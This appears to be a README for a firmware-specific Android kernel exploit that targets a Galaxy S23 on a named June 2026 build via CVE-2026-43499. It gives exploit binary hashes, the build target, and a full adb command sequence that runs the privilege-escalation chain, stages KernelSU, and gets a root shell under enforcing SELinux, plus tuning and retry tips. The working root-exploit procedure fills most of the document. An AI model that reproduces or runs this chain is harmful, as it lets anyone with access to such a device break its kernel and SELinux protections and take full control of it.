# Galaxy S23 SM-S911B (S911BXXSAFZF5) payload

Exact-firmware profile for the Galaxy S23 base model on
`S911BXXSAFZF5` (`BP4A.251205.006.S911BXXSAFZF5`), kernel
`5.15.189-android13-8-33413713-abS911BXXSAFZF5`, June 2026 patch.

## Status

**Hardware-verified end-to-end on a real SM-S911B** (2026-11-15): full root
chain, KernelSU late-load, and `su` in `u:r:ksu:s0` with SELinux enforcing.
Root is volatile per boot. Full record:
[`../../docs/SM-S911B-S911BXXSAFZF5.md`](../../docs/SM-S911B-S911BXXSAFZF5.md).

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `2dab5d9f58f209b61f96752bd051c4f58a240e2ce0fc70a0c6b3bc155d1d9fb4` |
| `cve-2026-43499-root` | `e7a4f96ce391fc28471711542800113859055a295e1da9229f0a32ed544acdf2` |
| `../../kernelsu/android13-5.15.189_kernelsu-dm1q-S911BXXSAFZF5.ko` | `318a4ceb4bd5f32e8f59d95c2272aaf9cc5ea141869d13d1a700caedba65b18b` |
| `../../kernelsu/ksud-dm1q-S911BXXSAFZF5-kdp` | `07302e5a79cc6c57d23a06cbb996c2f31c50c29589c03cf40278cfe43ab92639` |

`cve-2026-43499-app.so` is built from this tree with
`make TARGET=dm1q-S911BXXSAFZF5` (NDK r29); the profile selects the MCAST
stack writer and the tracefs/shaped-configfs-pipe route.

## Manual run (adb)

```sh
adb push cve-2026-43499-app.so /data/local/tmp/dm1q.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ksud-dm1q-S911BXXSAFZF5-kdp /data/local/tmp/ksud-s25u-kdp
adb shell chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp

adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 \
  EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/dm1q.so \
  /data/local/tmp/cve-2026-43499-root /data/local/tmp/dm1q-fzf5.log"

adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; chmod 755 /data/local/tmp/.ksud-stage; mkdir -p /data/adb'"
adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
adb shell "su -c id"
```

Run soon after boot. One attempt per boot: after the stack-writer stage a
failure leaves PI state behind (`stack writer ran; refusing retry on this
boot`) — reboot and retry. Freezes and panic-reboots are expected failure
modes of this exploit; hold power to recover.

## Notes

- Do not force `SLIDE_P0_OFFSET`; the tracefs scan must produce the canonical
  data mode.
- `--allow-shell` is required by the guarded late-load for `su` from the
  `shell` UID; the helper passes it.
- Root and KernelSU are volatile; both are gone after a reboot.
